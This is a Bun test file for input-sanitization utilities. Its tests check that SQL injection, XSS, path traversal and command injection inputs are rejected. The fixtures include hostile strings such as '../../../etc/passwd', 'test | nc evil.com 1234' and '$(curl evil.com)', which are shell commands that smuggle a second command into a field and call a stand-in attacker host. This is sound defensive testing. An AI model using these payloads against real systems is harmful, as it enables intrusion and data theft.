/**
 * @file Input Sanitization Tests
 * Tests for the input sanitization and validation utilities
 */

import { describe, expect, test } from "bun:test";
import {
    sanitizeString,
    sanitizeUserId,
    sanitizeContent,
    sanitizeMetadata,
    sanitizeTags,
    detectSuspiciousActivity,
    UserIdValidationSchema,
    ContentValidationSchema,
    MetadataValidationSchema,
    TagsValidationSchema,
} from "../../src/utils/inputSanitization";
import { SecurityError } from "../../src/core/security";

describe("Input Sanitization", () => {
    describe("sanitizeString", () => {
        test("sanitizes basic string input", () => {
            const result = sanitizeString("  Hello World  ");
            expect(result).toBe("Hello World");
        });

        test("detects SQL injection attempts", () => {
            expect(() => sanitizeString("'; DROP TABLE users; --")).toThrow(SecurityError);
            expect(() => sanitizeString("1 OR 1=1")).toThrow(SecurityError);
            expect(() => sanitizeString("UNION SELECT * FROM passwords")).toThrow(SecurityError);
        });

        test("detects XSS attempts", () => {
            expect(() => sanitizeString("<script>alert('xss')</script>")).toThrow(SecurityError);
            expect(() => sanitizeString("<iframe src='evil.com'></iframe>")).toThrow(SecurityError);
            expect(() => sanitizeString("javascript:alert(1)")).toThrow(SecurityError);
        });

        test("detects path traversal attempts", () => {
            expect(() => sanitizeString("../../../etc/passwd")).toThrow(SecurityError);
            expect(() => sanitizeString("..\\..\\windows\\system32")).toThrow(SecurityError);
            expect(() => sanitizeString("%2e%2e%2fpasswd")).toThrow(SecurityError);
        });

        test("detects command injection attempts", () => {
            expect(() => sanitizeString("test; cat /etc/passwd")).toThrow(SecurityError);
            expect(() => sanitizeString("test | nc evil.com 1234")).toThrow(SecurityError);
            expect(() => sanitizeString("$(curl evil.com)")).toThrow(SecurityError);
        });

        test("enforces length limits", () => {
            const longString = "a".repeat(10001);
            expect(() => sanitizeString(longString)).toThrow(SecurityError);
        });

        test("allows HTML when specified", () => {
            const result = sanitizeString("<p>Hello</p>", { allowHtml: true });
            expect(result).toBe("<p>Hello</p>");
        });
    });

    describe("sanitizeUserId", () => {
        test("sanitizes valid user IDs", () => {
            expect(sanitizeUserId("user123")).toBe("user123");
            expect(sanitizeUserId("user@example.com")).toBe("user@example.com");
            expect(sanitizeUserId("user-name_123")).toBe("user-name_123");
        });

        test("rejects invalid user ID formats", () => {
            expect(() => sanitizeUserId("user<script>")).toThrow(SecurityError);
            expect(() => sanitizeUserId("user;DROP")).toThrow(SecurityError);
            expect(() => sanitizeUserId("user/path")).toThrow(SecurityError);
        });

        test("handles null/undefined input", () => {
            expect(sanitizeUserId(null)).toBe(null);
            expect(sanitizeUserId(undefined)).toBe(null);
        });
    });

    describe("sanitizeContent", () => {
        test("sanitizes content while preserving legitimate text", () => {
            const content = "This is a normal content with some text.";
            expect(sanitizeContent(content)).toBe(content);
        });

        test("blocks malicious content", () => {
            expect(() => sanitizeContent("<script>alert('xss')</script>")).toThrow(SecurityError);
            expect(() => sanitizeContent("'; DROP TABLE memories; --")).toThrow(SecurityError);
        });

        test("enforces content length limits", () => {
            const longContent = "a".repeat(50001);
            expect(() => sanitizeContent(longContent)).toThrow(SecurityError);
        });
    });

    describe("sanitizeMetadata", () => {
        test("sanitizes metadata object", () => {
            const metadata = {
                title: "Test Title",
                description: "Test Description",
                count: 42,
                active: true,
            };
            const result = sanitizeMetadata(metadata);
            expect(result.title).toBe("Test Title");
            expect(result.description).toBe("Test Description");
            expect(result.count).toBe(42);
            expect(result.active).toBe(true);
        });

        test("blocks malicious metadata", () => {
            const metadata = {
                "title<script>": "value",
                "normal": "<script>alert('xss')</script>",
            };
            expect(() => sanitizeMetadata(metadata)).toThrow(SecurityError);
        });

        test("handles non-object input", () => {
            expect(sanitizeMetadata(null as any)).toEqual({});
            expect(sanitizeMetadata("string" as any)).toEqual({});
        });
    });

    describe("sanitizeTags", () => {
        test("sanitizes valid tags", () => {
            const tags = ["tag1", "tag2", "tag3"];
            const result = sanitizeTags(tags);
            expect(result).toEqual(tags);
        });

        test("filters out malicious tags", () => {
            const tags = ["normal", "<script>", "'; DROP TABLE"];
            expect(() => sanitizeTags(tags)).toThrow(SecurityError);
        });

        test("limits number of tags", () => {
            const manyTags = Array.from({ length: 60 }, (_, i) => `tag${i}`);
            const result = sanitizeTags(manyTags);
            expect(result.length).toBe(50);
        });

        test("handles non-array input", () => {
            expect(sanitizeTags("not-array" as any)).toEqual([]);
        });
    });

    describe("detectSuspiciousActivity", () => {
        test("detects repeated patterns", () => {
            expect(detectSuspiciousActivity("aaaaaaaaaaaaaaaaaaa")).toBe(true);
            expect(detectSuspiciousActivity("<<<<<<<<")).toBe(true);
            expect(detectSuspiciousActivity("'''''''''")).toBe(true);
            expect(detectSuspiciousActivity(";;;;")).toBe(true);
        });

        test("allows normal content", () => {
            expect(detectSuspiciousActivity("This is normal content")).toBe(false);
            expect(detectSuspiciousActivity("user@example.com")).toBe(false);
        });
    });

    describe("Zod Schema Integration", () => {
        test("UserIdValidationSchema works correctly", () => {
            expect(UserIdValidationSchema.parse("user123")).toBe("user123");
            expect(() => UserIdValidationSchema.parse("")).toThrow();
            expect(() => UserIdValidationSchema.parse("user<script>")).toThrow();
        });

        test("ContentValidationSchema works correctly", () => {
            const content = "This is valid content";
            expect(ContentValidationSchema.parse(content)).toBe(content);
            expect(() => ContentValidationSchema.parse("")).toThrow();
        });

        test("MetadataValidationSchema works correctly", () => {
            const metadata = { title: "Test" };
            const result = MetadataValidationSchema.parse(metadata);
            expect(result.title).toBe("Test");
        });

        test("TagsValidationSchema works correctly", () => {
            const tags = ["tag1", "tag2"];
            const result = TagsValidationSchema.parse(tags);
            expect(result).toEqual(tags);
        });
    });
});